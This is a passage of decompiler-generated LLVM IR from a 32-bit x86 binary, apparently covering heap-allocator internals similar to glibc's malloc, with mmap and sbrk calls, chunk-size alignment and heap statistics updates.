  %v1_804a1e9 = add i32 %v0_804a1e9, 8
  store i32 %v1_804a1e9, i32* %ebx.global-to-local, align 4
  %v0_804a1ec = load i32, i32* @edi, align 4
  %v2_804a1ec = mul i32 %v0_804a1ec, 2
  store i32 %v2_804a1ec, i32* @edi, align 4
  %v1_804a19d.pre = load i32, i32* @esi, align 4
  br label %.preheader

dec_label_pc_804a1f0:                             ; preds = %dec_label_pc_804a1d5
  %v1_804a1f0 = add i32 %v3_804a1d5, 4
  %v2_804a1f0 = inttoptr i32 %v1_804a1f0 to i32*
  %v3_804a1f0 = load i32, i32* %v2_804a1f0, align 4
  %v1_804a1f3 = and i32 %v3_804a1f0, -4
  store i32 %v1_804a1f3, i32* @ecx, align 4
  %v5_804a1f8 = sub i32 %v1_804a1f3, %v1_804a2f1
  store i32 %v5_804a1f8, i32* %esi.global-to-local, align 4
  %v1_804a1fc = add i32 %v3_804a1d5, 12
  %v2_804a1fc = inttoptr i32 %v1_804a1fc to i32*
  %v3_804a1fc = load i32, i32* %v2_804a1fc, align 4
  store i32 %v3_804a1fc, i32* %eax.global-to-local, align 4
  store i32 %v3_804a1fc, i32* %v2_804a1d5, align 4
  %v0_804a202 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a202 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a202 = add i32 %v1_804a202, 8
  %v3_804a202 = inttoptr i32 %v2_804a202 to i32*
  store i32 %v0_804a202, i32* %v3_804a202, align 4
  %v0_804a205 = load i32, i32* %esi.global-to-local, align 4
  %tmp142 = icmp ult i32 %v0_804a205, 16
  br i1 %tmp142, label %dec_label_pc_804a20a, label %dec_label_pc_804a214

dec_label_pc_804a20a:                             ; preds = %dec_label_pc_804a1f0
  %v0_804a20a = load i32, i32* %edx.global-to-local, align 4
  %v1_804a20a = load i32, i32* @ecx, align 4
  %v2_804a20a = add i32 %v0_804a20a, 4
  %v3_804a20a = add i32 %v2_804a20a, %v1_804a20a
  %v4_804a20a = inttoptr i32 %v3_804a20a to i32*
  %v5_804a20a = load i32, i32* %v4_804a20a, align 4
  %v6_804a20a = or i32 %v5_804a20a, 1
  store i32 %v6_804a20a, i32* %v4_804a20a, align 4
  br label %dec_label_pc_8049f6c

dec_label_pc_804a214:                             ; preds = %dec_label_pc_804a1f0
  store i32 %v1_804a2f1, i32* %eax.global-to-local, align 4
  %v0_804a218 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a218 = add i32 %v0_804a218, %v1_804a2f1
  store i32 %v2_804a218, i32* @ecx, align 4
  store i32 %v0_804a0ce.lcssa, i32* %ebx.global-to-local, align 4
  %v2_804a21f = add i32 %v0_804a0ce.lcssa, 8
  %v3_804a21f = inttoptr i32 %v2_804a21f to i32*
  store i32 %v2_804a218, i32* %v3_804a21f, align 4
  %v0_804a222 = load i32, i32* @ecx, align 4
  %v1_804a222 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a222 = add i32 %v1_804a222, 12
  %v3_804a222 = inttoptr i32 %v2_804a222 to i32*
  store i32 %v0_804a222, i32* %v3_804a222, align 4
  %v0_804a225 = load i32, i32* @ecx, align 4
  %v1_804a225 = add i32 %v0_804a225, 8
  %v2_804a225 = inttoptr i32 %v1_804a225 to i32*
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %v2_804a225, align 4
  %v0_804a22c = load i32, i32* @ecx, align 4
  %v1_804a22c = add i32 %v0_804a22c, 12
  %v2_804a22c = inttoptr i32 %v1_804a22c to i32*
  store i32 ptrtoint (i32* @global_var_8055844.40 to i32), i32* %v2_804a22c, align 4
  %v0_804a233 = load i32, i32* %eax.global-to-local, align 4
  %v6_804a238 = icmp ugt i32 %v0_804a233, 255
  br i1 %v6_804a238, label %dec_label_pc_804a240, label %dec_label_pc_804a23a

dec_label_pc_804a23a:                             ; preds = %dec_label_pc_804a214
  %v0_804a23a = load i32, i32* @ecx, align 4
  store i32 %v0_804a23a, i32* @global_var_8055840.37, align 64
  br label %dec_label_pc_804a240

dec_label_pc_804a240:                             ; preds = %dec_label_pc_804a214, %dec_label_pc_804a23a
  %v4_804a240 = or i32 %v1_804a2f1, 1
  %v1_804a249 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a249 = add i32 %v1_804a249, 4
  %v3_804a249 = inttoptr i32 %v2_804a249 to i32*
  store i32 %v4_804a240, i32* %v3_804a249, align 4
  %v0_804a24c = load i32, i32* %esi.global-to-local, align 4
  %v1_804a24e = or i32 %v0_804a24c, 1
  store i32 %v1_804a24e, i32* %eax.global-to-local, align 4
  %v1_804a251 = load i32, i32* @ecx, align 4
  %v2_804a251 = add i32 %v1_804a251, 4
  %v3_804a251 = inttoptr i32 %v2_804a251 to i32*
  store i32 %v1_804a24e, i32* %v3_804a251, align 4
  %v0_804a254 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a254 = load i32, i32* @ecx, align 4
  %v3_804a254 = add i32 %v1_804a254, %v0_804a254
  %v4_804a254 = inttoptr i32 %v3_804a254 to i32*
  store i32 %v0_804a254, i32* %v4_804a254, align 4
  br label %dec_label_pc_8049f6c

dec_label_pc_804a25c.loopexit:                    ; preds = %dec_label_pc_804a1a5
  br label %dec_label_pc_804a25c

dec_label_pc_804a25c:                             ; preds = %dec_label_pc_804a25c.loopexit, %dec_label_pc_8049efb, %dec_label_pc_8049f03
  %v0_804a25c = load i32, i32* @global_var_805583c.36, align 4
  store i32 %v0_804a25c, i32* @ebx, align 4
  %v1_804a262 = add i32 %v0_804a25c, 4
  %v2_804a262 = inttoptr i32 %v1_804a262 to i32*
  %v3_804a262 = load i32, i32* %v2_804a262, align 4
  %v1_804a265 = and i32 %v3_804a262, -4
  store i32 %v1_804a265, i32* %ecx.global-to-local, align 4
  %v1_804a26c = add i32 %v1_804a2f1, 16
  store i32 %v1_804a26c, i32* %edx.global-to-local, align 4
  %v7_804a273 = icmp ult i32 %v1_804a265, %v1_804a26c
  br i1 %v7_804a273, label %dec_label_pc_804a29c, label %dec_label_pc_804a277

dec_label_pc_804a277:                             ; preds = %dec_label_pc_804a25c
  %v2_804a27b = add i32 %v0_804a25c, %v1_804a2f1
  store i32 %v2_804a27b, i32* %edx.global-to-local, align 4
  store i32 %v2_804a27b, i32* @global_var_805583c.36, align 4
  %v1_804a284 = or i32 %v1_804a2f1, 1
  store i32 %v1_804a284, i32* %eax.global-to-local, align 4
  store i32 %v1_804a284, i32* %v2_804a262, align 4
  %v0_804a28a = load i32, i32* %ecx.global-to-local, align 4
  %v5_804a28a = sub i32 %v0_804a28a, %v1_804a2f1
  %v1_804a28e = or i32 %v5_804a28a, 1
  store i32 %v1_804a28e, i32* @ecx, align 4
  %v1_804a291 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a291 = add i32 %v1_804a291, 4
  %v3_804a291 = inttoptr i32 %v2_804a291 to i32*
  store i32 %v1_804a28e, i32* %v3_804a291, align 4
  br label %dec_label_pc_804a294

dec_label_pc_804a294:                             ; preds = %dec_label_pc_8049fc5, %dec_label_pc_804a024, %dec_label_pc_804a277
  %v0_804a294 = load i32, i32* @ebx, align 4
  %v1_804a294 = add i32 %v0_804a294, 8
  store i32 %v1_804a294, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804a604

dec_label_pc_804a29c:                             ; preds = %dec_label_pc_804a25c
  %v0_804a29c = load i32, i32* @global_var_8055b6c.42, align 4
  store i32 %v0_804a29c, i32* %edx.global-to-local, align 4
  %v0_804a2a2 = load i8, i8* @global_var_8055810.34, align 16
  %v1_804a2a2 = and i8 %v0_804a2a2, 2
  %v2_804a2a2 = icmp eq i8 %v1_804a2a2, 0
  br i1 %v2_804a2a2, label %dec_label_pc_804a2c9, label %dec_label_pc_804a2ab

dec_label_pc_804a2ab:                             ; preds = %dec_label_pc_804a29c
  store i32 ptrtoint (i8* @global_var_8055810.34 to i32), i32* %stack_var_-72, align 4
  %v2_804a2b0 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8055810.34 to i32*))
  %v1_804a2b9 = add i32 %v1_804a2f1, -7
  store i32 %v1_804a2b9, i32* %eax.global-to-local, align 4
  %v1_804a2bd = call i32 @malloc(i32 %v1_804a2b9)
  store i32 %v1_804a2bd, i32* %eax.global-to-local, align 4
  store i32 %v1_804a2b9, i32* %ebx.global-to-local, align 4
  %v2_804a2c3 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_804a2c3, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804a602

dec_label_pc_804a2c9:                             ; preds = %dec_label_pc_804a29c
  %v1_804a2c9 = add i32 %v0_804a29c, -1
  store i32 %v1_804a2c9, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a2f1, i32* %ebx.global-to-local, align 4
  %v1_804a2d4 = load i32, i32* @global_var_8055b5c.43, align 4
  %v7_804a2d4 = icmp ult i32 %v1_804a2f1, %v1_804a2d4
  br i1 %v7_804a2d4, label %dec_label_pc_804a394, label %dec_label_pc_804a2e0

dec_label_pc_804a2e0:                             ; preds = %dec_label_pc_804a2c9
  %v0_804a2e0 = load i32, i32* @global_var_8055b60.44, align 32
  store i32 %v0_804a2e0, i32* %eax.global-to-local, align 4
  %v1_804a2e5 = load i32, i32* @global_var_8055b64.45, align 4
  %v5_804a2eb = icmp slt i32 %v0_804a2e0, %v1_804a2e5
  br i1 %v5_804a2eb, label %dec_label_pc_804a2f1, label %dec_label_pc_804a394

dec_label_pc_804a2f1:                             ; preds = %dec_label_pc_804a2e0
  %v2_804a2f1 = add i32 %v1_804a2f1, 10
  %v3_804a2f1 = add i32 %v2_804a2f1, %v0_804a29c
  %v1_804a2f7 = sub i32 0, %v0_804a29c
  store i32 %v1_804a2f7, i32* %eax.global-to-local, align 4
  %v2_804a2f9 = and i32 %v3_804a2f1, %v1_804a2f7
  store i32 %v2_804a2f9, i32* @ebx, align 4
  %tmp143 = icmp ugt i32 %v2_804a2f9, %v1_804a2f1
  br i1 %tmp143, label %dec_label_pc_804a305, label %dec_label_pc_804a394

dec_label_pc_804a305:                             ; preds = %dec_label_pc_804a2f1
  store i32 0, i32* %stack_var_-72, align 4
  store i32 3, i32* %stack_var_-84, align 4
  %v6_804a310 = call i32 @mmap(i32 0, i32 %v2_804a2f9, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_804a310, i32* %eax.global-to-local, align 4
  store i32 %v6_804a310, i32* %edx.global-to-local, align 4
  %v10_804a31a = icmp eq i32 %v6_804a310, -1
  br i1 %v10_804a31a, label %dec_label_pc_804a305.dec_label_pc_804a394_crit_edge, label %dec_label_pc_804a31f

dec_label_pc_804a305.dec_label_pc_804a394_crit_edge: ; preds = %dec_label_pc_804a305
  %v0_804a394.pre = load i32, i32* @global_var_805583c.36, align 4
  br label %dec_label_pc_804a394

dec_label_pc_804a31f:                             ; preds = %dec_label_pc_804a305
  %v1_804a321 = urem i32 %v6_804a310, 8
  %v2_804a321 = icmp eq i32 %v1_804a321, 0
  store i32 %v1_804a321, i32* @ecx, align 4
  br i1 %v2_804a321, label %dec_label_pc_804a339, label %dec_label_pc_804a326

dec_label_pc_804a326:                             ; preds = %dec_label_pc_804a31f
  %v2_804a32b = sub nsw i32 8, %v1_804a321
  store i32 %v2_804a32b, i32* %eax.global-to-local, align 4
  %v2_804a32d = add i32 %v2_804a32b, %v6_804a310
  store i32 %v2_804a32d, i32* %edx.global-to-local, align 4
  %v2_804a32f = inttoptr i32 %v2_804a32d to i32*
  store i32 %v2_804a32b, i32* %v2_804a32f, align 4
  %v0_804a331 = load i32, i32* @ebx, align 4
  %v1_804a333 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a333 = sub i32 %v0_804a331, %v1_804a333
  store i32 %v2_804a333, i32* @ecx, align 4
  br label %dec_label_pc_804a341

dec_label_pc_804a339:                             ; preds = %dec_label_pc_804a31f
  %v1_804a339 = inttoptr i32 %v6_804a310 to i32*
  store i32 0, i32* %v1_804a339, align 4
  %v0_804a33f = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a341

dec_label_pc_804a341:                             ; preds = %dec_label_pc_804a326, %dec_label_pc_804a339
  %storemerge = phi i32 [ %v2_804a333, %dec_label_pc_804a326 ], [ %v0_804a33f, %dec_label_pc_804a339 ]
  %v1_804a341 = or i32 %storemerge, 2
  %v1_804a344 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a344 = add i32 %v1_804a344, 4
  %v3_804a344 = inttoptr i32 %v2_804a344 to i32*
  store i32 %v1_804a341, i32* %v3_804a344, align 4
  %v0_804a347 = load i32, i32* @global_var_8055b60.44, align 32
  %v1_804a34c = add i32 %v0_804a347, 1
  store i32 %v1_804a34c, i32* %eax.global-to-local, align 4
  store i32 %v1_804a34c, i32* @global_var_8055b60.44, align 32
  %v1_804a352 = load i32, i32* @global_var_8055b68.46, align 8
  %v7_804a358 = icmp sgt i32 %v1_804a34c, %v1_804a352
  br i1 %v7_804a358, label %dec_label_pc_804a35a, label %dec_label_pc_804a35f

dec_label_pc_804a35a:                             ; preds = %dec_label_pc_804a341
  store i32 %v1_804a34c, i32* @global_var_8055b68.46, align 8
  br label %dec_label_pc_804a35f

dec_label_pc_804a35f:                             ; preds = %dec_label_pc_804a341, %dec_label_pc_804a35a
  %v0_804a35f = load i32, i32* @ebx, align 4
  %v1_804a361 = load i32, i32* @global_var_8055b74.47, align 4
  %v2_804a361 = add i32 %v1_804a361, %v0_804a35f
  store i32 %v2_804a361, i32* %eax.global-to-local, align 4
  store i32 %v2_804a361, i32* @global_var_8055b74.47, align 4
  %v1_804a36c = load i32, i32* @global_var_8055b80.48, align 128
  %tmp144 = icmp ugt i32 %v2_804a361, %v1_804a36c
  br i1 %tmp144, label %dec_label_pc_804a374, label %dec_label_pc_804a379

dec_label_pc_804a374:                             ; preds = %dec_label_pc_804a35f
  store i32 %v2_804a361, i32* @global_var_8055b80.48, align 128
  br label %dec_label_pc_804a379

dec_label_pc_804a379:                             ; preds = %dec_label_pc_804a35f, %dec_label_pc_804a374
  %v1_804a379 = load i32, i32* @global_var_8055b78.49, align 8
  %v2_804a379 = add i32 %v1_804a379, %v2_804a361
  store i32 %v2_804a379, i32* %eax.global-to-local, align 4
  %v1_804a37f = load i32, i32* @global_var_8055b84.50, align 4
  %tmp145 = icmp ugt i32 %v2_804a379, %v1_804a37f
  br i1 %tmp145, label %dec_label_pc_804a387, label %dec_label_pc_804a38c

dec_label_pc_804a387:                             ; preds = %dec_label_pc_804a379
  store i32 %v2_804a379, i32* @global_var_8055b84.50, align 4
  br label %dec_label_pc_804a38c

dec_label_pc_804a38c:                             ; preds = %dec_label_pc_804a379, %dec_label_pc_804a387
  %v0_804a38c = load i32, i32* %edx.global-to-local, align 4
  %v1_804a38c = add i32 %v0_804a38c, 8
  store i32 %v1_804a38c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a602

dec_label_pc_804a394:                             ; preds = %dec_label_pc_804a2f1, %dec_label_pc_804a305.dec_label_pc_804a394_crit_edge, %dec_label_pc_804a2e0, %dec_label_pc_804a2c9
  %v0_804a394 = phi i32 [ %v0_804a394.pre, %dec_label_pc_804a305.dec_label_pc_804a394_crit_edge ], [ %v0_804a25c, %dec_label_pc_804a2e0 ], [ %v0_804a25c, %dec_label_pc_804a2f1 ], [ %v0_804a25c, %dec_label_pc_804a2c9 ]
  store i32 %v0_804a394, i32* %ebx.global-to-local, align 4
  %v1_804a39e = add i32 %v0_804a394, 4
  %v2_804a39e = inttoptr i32 %v1_804a39e to i32*
  %v3_804a39e = load i32, i32* %v2_804a39e, align 4
  %v1_804a3a1 = and i32 %v3_804a39e, -4
  %v2_804a3a1 = icmp eq i32 %v1_804a3a1, 0
  %v0_804a3a8 = load i32, i32* @global_var_8055b58.51, align 8
  %v5_804a3b0 = add i32 %v1_804a26c, %v0_804a3a8
  store i32 %v5_804a3b0, i32* %eax.global-to-local, align 4
  store i32 %v5_804a3b0, i32* %edx.global-to-local, align 4
  %v0_804a3b6 = load i8, i8* @global_var_8055b70.52, align 16
  %v1_804a3b6 = urem i8 %v0_804a3b6, 2
  %v2_804a3b6 = icmp eq i8 %v1_804a3b6, 0
  br i1 %v2_804a3b6, label %dec_label_pc_804a3c3, label %dec_label_pc_804a3bf

dec_label_pc_804a3bf:                             ; preds = %dec_label_pc_804a394
  %v5_804a3bf = sub i32 %v5_804a3b0, %v1_804a3a1
  store i32 %v5_804a3bf, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a3c3

dec_label_pc_804a3c3:                             ; preds = %dec_label_pc_804a394, %dec_label_pc_804a3bf
  %v0_804a3d1 = phi i32 [ %v5_804a3b0, %dec_label_pc_804a394 ], [ %v5_804a3bf, %dec_label_pc_804a3bf ]
  %v1_804a3c7 = sub i32 0, %v0_804a29c
  store i32 %v1_804a3c7, i32* @ecx, align 4
  store i32 %v1_804a2c9, i32* @ebx, align 4
  %v2_804a3d1 = add i32 %v0_804a3d1, %v1_804a2c9
  %v2_804a3d4 = and i32 %v2_804a3d1, %v1_804a3c7
  store i32 %v2_804a3d4, i32* @esi, align 4
  store i32 %v2_804a3d4, i32* @edi, align 4
  %tmp97 = icmp slt i32 %v2_804a3d4, 1
  br i1 %tmp97, label %dec_label_pc_804a3ea, label %dec_label_pc_804a3dc

dec_label_pc_804a3dc:                             ; preds = %dec_label_pc_804a3c3
  store i32 %v2_804a3d4, i32* %stack_var_-72, align 4
  %v1_804a3dd = call i32 @__GI_sbrk(i32 %v2_804a3d4)
  store i32 %v1_804a3dd, i32* %eax.global-to-local, align 4
  store i32 %v1_804a3dd, i32* @ebx, align 4
  %v2_804a3e4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_804a3e4, i32* @ecx, align 4
  %v10_804a3e5 = icmp eq i32 %v1_804a3dd, -1
  %v1_804a3e8 = icmp eq i1 %v10_804a3e5, false
  br i1 %v1_804a3e8, label %dec_label_pc_804a442.dec_label_pc_804a44b_crit_edge, label %dec_label_pc_804a3dc.dec_label_pc_804a3ea_crit_edge

dec_label_pc_804a3dc.dec_label_pc_804a3ea_crit_edge: ; preds = %dec_label_pc_804a3dc
  %v0_804a3ea.pre = load i8, i8* @global_var_8055b70.52, align 16
  br label %dec_label_pc_804a3ea

dec_label_pc_804a3ea:                             ; preds = %dec_label_pc_804a3dc.dec_label_pc_804a3ea_crit_edge, %dec_label_pc_804a3c3
  %v0_804a3ea = phi i8 [ %v0_804a3ea.pre, %dec_label_pc_804a3dc.dec_label_pc_804a3ea_crit_edge ], [ %v0_804a3b6, %dec_label_pc_804a3c3 ]
  %v1_804a3ea = urem i8 %v0_804a3ea, 2
  %v2_804a3ea = icmp eq i8 %v1_804a3ea, 0
  br i1 %v2_804a3ea, label %dec_label_pc_804a3ea.dec_label_pc_804a402_crit_edge, label %dec_label_pc_804a3f3

dec_label_pc_804a3ea.dec_label_pc_804a402_crit_edge: ; preds = %dec_label_pc_804a3ea
  %v0_804a402.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a402

dec_label_pc_804a3f3:                             ; preds = %dec_label_pc_804a3ea
  %v5_804a3f7 = add i32 %v1_804a3a1, %v1_804a2c9
  store i32 %v5_804a3f7, i32* %eax.global-to-local, align 4
  %v1_804a3fb = load i32, i32* @esi, align 4
  %v2_804a3fb = add i32 %v1_804a3fb, %v5_804a3f7
  %v5_804a3fe = and i32 %v2_804a3fb, %v1_804a3c7
  store i32 %v5_804a3fe, i32* @edi, align 4
  br label %dec_label_pc_804a402

dec_label_pc_804a402:                             ; preds = %dec_label_pc_804a3ea.dec_label_pc_804a402_crit_edge, %dec_label_pc_804a3f3
  %v0_804a402 = phi i32 [ %v0_804a402.pre, %dec_label_pc_804a3ea.dec_label_pc_804a402_crit_edge ], [ %v5_804a3fe, %dec_label_pc_804a3f3 ]
  %tmp146 = icmp ult i32 %v0_804a402, 1048576
  br i1 %tmp146, label %dec_label_pc_804a40a, label %dec_label_pc_804a40f

dec_label_pc_804a40a:                             ; preds = %dec_label_pc_804a402
  store i32 1048576, i32* @edi, align 4
  br label %dec_label_pc_804a40f

dec_label_pc_804a40f:                             ; preds = %dec_label_pc_804a402, %dec_label_pc_804a40a
  %v0_804a421 = phi i32 [ %v0_804a402, %dec_label_pc_804a402 ], [ 1048576, %dec_label_pc_804a40a ]
  %tmp147 = icmp ugt i32 %v0_804a421, %v1_804a2f1
  br i1 %tmp147, label %dec_label_pc_804a419, label %dec_label_pc_804a5f5

dec_label_pc_804a419:                             ; preds = %dec_label_pc_804a40f
  store i32 0, i32* %stack_var_-72, align 4
  store i32 3, i32* %stack_var_-84, align 4
  %v6_804a424 = call i32 @mmap(i32 0, i32 %v0_804a421, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_804a424, i32* %eax.global-to-local, align 4
  store i32 %v6_804a424, i32* @ebx, align 4
  %v10_804a42e = icmp eq i32 %v6_804a424, -1
  br i1 %v10_804a42e, label %dec_label_pc_804a442.thread101, label %dec_label_pc_804a442.thread

dec_label_pc_804a442.thread101:                   ; preds = %dec_label_pc_804a419
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a5f5

dec_label_pc_804a442.thread:                      ; preds = %dec_label_pc_804a419
  %v1_804a433 = load i32, i32* @edi, align 4
  %v2_804a433 = add i32 %v1_804a433, %v6_804a424
  store i32 %v2_804a433, i32* %edx.global-to-local, align 4
  %v0_804a436 = load i8, i8* @global_var_8055b70.52, align 1
  %v2_804a436 = and i8 %v0_804a436, -2
  store i8 %v2_804a436, i8* @global_var_8055b70.52, align 16
  br label %dec_label_pc_804a44b

dec_label_pc_804a442.dec_label_pc_804a44b_crit_edge: ; preds = %dec_label_pc_804a3dc
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804a453.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804a44b

dec_label_pc_804a44b:                             ; preds = %dec_label_pc_804a442.dec_label_pc_804a44b_crit_edge, %dec_label_pc_804a442.thread
  %v1_804a453 = phi i32 [ %v1_804a433, %dec_label_pc_804a442.thread ], [ %v1_804a453.pre, %dec_label_pc_804a442.dec_label_pc_804a44b_crit_edge ]
  %v0_804a50c100 = phi i32 [ %v6_804a424, %dec_label_pc_804a442.thread ], [ %v1_804a3dd, %dec_label_pc_804a442.dec_label_pc_804a44b_crit_edge ]
  %v0_804a50799 = phi i32 [ %v2_804a433, %dec_label_pc_804a442.thread ], [ -1, %dec_label_pc_804a442.dec_label_pc_804a44b_crit_edge ]
  %v5_804a44f = add i32 %v1_804a3a1, %v0_804a394
  store i32 %v5_804a44f, i32* %ecx.global-to-local, align 4
  %v0_804a453 = load i32, i32* @global_var_8055b78.49, align 8
  %v2_804a453 = add i32 %v1_804a453, %v0_804a453
  store i32 %v2_804a453, i32* @global_var_8055b78.49, align 8
  %v2_804a459 = sub i32 %v0_804a50c100, %v5_804a44f
  %v7_804a459 = icmp ult i32 %v0_804a50c100, %v5_804a44f
  %v12_804a459 = icmp eq i32 %v2_804a459, 0
  %v1_804a45b = icmp eq i1 %v12_804a459, false
  br i1 %v1_804a45b, label %dec_label_pc_804a478, label %dec_label_pc_804a45d

dec_label_pc_804a45d:                             ; preds = %dec_label_pc_804a44b
  %v10_804a45d = icmp eq i32 %v0_804a50799, -1
  %v1_804a460 = icmp eq i1 %v10_804a45d, false
  br i1 %v1_804a460, label %dec_label_pc_804a478, label %dec_label_pc_804a462

dec_label_pc_804a462:                             ; preds = %dec_label_pc_804a45d
  store i32 %v1_804a3a1, i32* %edx.global-to-local, align 4
  %v2_804a466 = add i32 %v1_804a453, %v1_804a3a1
  %v1_804a469 = or i32 %v2_804a466, 1
  store i32 %v1_804a469, i32* %eax.global-to-local, align 4
  store i32 %v0_804a394, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a469, i32* %v2_804a39e, align 4
  br label %dec_label_pc_804a59c

dec_label_pc_804a478:                             ; preds = %dec_label_pc_804a45d, %dec_label_pc_804a44b
  %v0_804a478 = load i8, i8* @global_var_8055b70.52, align 1
  %v1_804a478 = sext i8 %v0_804a478 to i32
  store i32 %v1_804a478, i32* %eax.global-to-local, align 4
  %v2_804a47d = urem i8 %v0_804a478, 2
  %v3_804a47d = icmp eq i8 %v2_804a47d, 0
  br i1 %v3_804a47d, label %dec_label_pc_804a494, label %dec_label_pc_804a481

dec_label_pc_804a481:                             ; preds = %dec_label_pc_804a478
  br i1 %v2_804a3a1, label %dec_label_pc_804a494, label %dec_label_pc_804a488

dec_label_pc_804a488:                             ; preds = %dec_label_pc_804a481
  %v1_804a48a = icmp eq i1 %v7_804a459, false
  br i1 %v1_804a48a, label %dec_label_pc_804a494, label %dec_label_pc_804a48c

dec_label_pc_804a48c:                             ; preds = %dec_label_pc_804a488
  %v1_804a48c = and i32 %v1_804a478, -2
  %v4_804a48c = trunc i32 %v1_804a48c to i8
  store i32 %v1_804a48c, i32* %eax.global-to-local, align 4
  store i8 %v4_804a48c, i8* @global_var_8055b70.52, align 16
  br label %dec_label_pc_804a494

dec_label_pc_804a494:                             ; preds = %dec_label_pc_804a488, %dec_label_pc_804a481, %dec_label_pc_804a478, %dec_label_pc_804a48c
  %v0_804a494 = phi i8 [ %v0_804a478, %dec_label_pc_804a488 ], [ %v0_804a478, %dec_label_pc_804a481 ], [ %v0_804a478, %dec_label_pc_804a478 ], [ %v4_804a48c, %dec_label_pc_804a48c ]
  %v1_804a494 = urem i8 %v0_804a494, 2
  %v2_804a494 = icmp eq i8 %v1_804a494, 0
  br i1 %v2_804a494, label %dec_label_pc_804a507, label %dec_label_pc_804a49d

dec_label_pc_804a49d:                             ; preds = %dec_label_pc_804a494
  br i1 %v2_804a3a1, label %dec_label_pc_804a4ae, label %dec_label_pc_804a4a4

dec_label_pc_804a4a4:                             ; preds = %dec_label_pc_804a49d
  store i32 %v2_804a459, i32* %eax.global-to-local, align 4
  %v2_804a4a8 = add i32 %v2_804a453, %v2_804a459
  store i32 %v2_804a4a8, i32* @global_var_8055b78.49, align 8
  br label %dec_label_pc_804a4ae

dec_label_pc_804a4ae:                             ; preds = %dec_label_pc_804a49d, %dec_label_pc_804a4a4
  %v1_804a4b0 = urem i32 %v0_804a50c100, 8
  %v2_804a4b0 = icmp eq i32 %v1_804a4b0, 0
  store i32 %v1_804a4b0, i32* %edx.global-to-local, align 4
  %v1_804a4b3 = icmp eq i1 %v2_804a4b0, false
  br i1 %v1_804a4b3, label %dec_label_pc_804a4bb, label %dec_label_pc_804a4b5

dec_label_pc_804a4b5:                             ; preds = %dec_label_pc_804a4ae
  store i32 %v0_804a50c100, i32* @ebp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a4c5

dec_label_pc_804a4bb:                             ; preds = %dec_label_pc_804a4ae
  %v2_804a4c0 = sub nsw i32 8, %v1_804a4b0
  store i32 %v2_804a4c0, i32* %eax.global-to-local, align 4
  %v2_804a4c2 = add i32 %v2_804a4c0, %v0_804a50c100
  store i32 %v2_804a4c2, i32* @ebp, align 4
  br label %dec_label_pc_804a4c5

dec_label_pc_804a4c5:                             ; preds = %dec_label_pc_804a4b5, %dec_label_pc_804a4bb
  %v0_804a4c9 = phi i32 [ 0, %dec_label_pc_804a4b5 ], [ %v2_804a4c0, %dec_label_pc_804a4bb ]
  store i32 %v1_804a3a1, i32* %ecx.global-to-local, align 4
  %v2_804a4cc = add i32 %v1_804a453, %v0_804a50c100
  store i32 %v2_804a4cc, i32* @edi, align 4
  %v2_804a4d2 = sub i32 0, %v2_804a4cc
  store i32 %v2_804a4d2, i32* %edx.global-to-local, align 4
  %v2_804a4c9 = add i32 %v1_804a3a1, %v1_804a2c9
  %v2_804a4cf = add i32 %v2_804a4c9, %v2_804a4cc
  %v5_804a4d4 = add i32 %v2_804a4cf, %v0_804a4c9
  %v5_804a4d8 = and i32 %v5_804a4d4, %v1_804a3c7
  store i32 %v5_804a4d8, i32* %eax.global-to-local, align 4
  %v2_804a4dc = sub i32 %v5_804a4d8, %v2_804a4cc
  store i32 %v2_804a4dc, i32* @esi, align 4
  store i32 %v2_804a4dc, i32* %stack_var_-72, align 4
  %v1_804a4e0 = call i32 @__GI_sbrk(i32 %v2_804a4dc)
  store i32 %v1_804a4e0, i32* %eax.global-to-local, align 4
  %v2_804a4e5 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_804a4e5, i32* %edx.global-to-local, align 4
  %v10_804a4e6 = icmp eq i32 %v1_804a4e0, -1
  %v1_804a4e9 = icmp eq i1 %v10_804a4e6, false
  br i1 %v1_804a4e9, label %dec_label_pc_804a4f6, label %dec_label_pc_804a4eb

dec_label_pc_804a4eb:                             ; preds = %dec_label_pc_804a4c5
  store i32 0, i32* %stack_var_-72, align 4
  %v1_804a4ed = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804a4ed, i32* %eax.global-to-local, align 4
  store i32 %v1_804a4ed, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a527

dec_label_pc_804a4f6:                             ; preds = %dec_label_pc_804a4c5
  store i32 %v1_804a4e0, i32* %edx.global-to-local, align 4
  %v1_804a4f8 = load i32, i32* @ebx, align 4
  %v7_804a4f8 = icmp ult i32 %v1_804a4e0, %v1_804a4f8
  %v1_804a4fa = icmp eq i1 %v7_804a4f8, false
  br i1 %v1_804a4fa, label %dec_label_pc_804a52a, label %dec_label_pc_804a4fc

dec_label_pc_804a4fc:                             ; preds = %dec_label_pc_804a4f6
  %v0_804a4fc = load i8, i8* @global_var_8055b70.52, align 1
  %v2_804a4fc = and i8 %v0_804a4fc, -2
  store i8 %v2_804a4fc, i8* @global_var_8055b70.52, align 16
  %v0_804a503 = load i32, i32* @edi, align 4
  store i32 %v0_804a503, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a50e

